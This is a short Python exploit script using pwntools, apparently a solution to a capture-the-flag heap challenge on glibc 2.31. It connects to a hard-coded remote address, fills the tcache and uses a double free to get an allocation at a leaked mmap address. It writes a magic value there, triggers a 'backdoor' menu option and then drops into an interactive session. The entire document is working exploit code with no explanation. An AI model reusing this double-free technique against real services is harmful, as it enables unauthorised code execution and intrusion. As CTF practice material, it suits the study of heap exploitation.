from pwn import *

###Util
def create(size,data):
    r.sendlineafter('Choice >','1')
    r.sendlineafter('size : ',str(size))
    r.sendafter('Content : ',data)

def delete(idx):
    r.sendlineafter('Choice >','2')
    r.sendlineafter('index : ',str(idx))

def backdoor():
    r.sendlineafter('Choice >','3')

###Addr
#  libc2.31

###Exploit
r = remote('140.112.31.97',30105)

mmap_addr = int(r.recvline()[:-1].split(b'0x')[1],16)-0x18
print(hex(mmap_addr))

for i in range(7):
    create(0x18,'M30W')
    delete(i)

create(0x18,'M30W')
create(0x18,'M30W')
delete(7)
delete(8)
delete(7)
create(0x18,p64(mmap_addr+7))
create(0x18,'M30W')
create(0x18,'M30W')
create(0x18,b'\x00'+p64(0xcafedeadbeefcafe))

backdoor()

r.interactive()
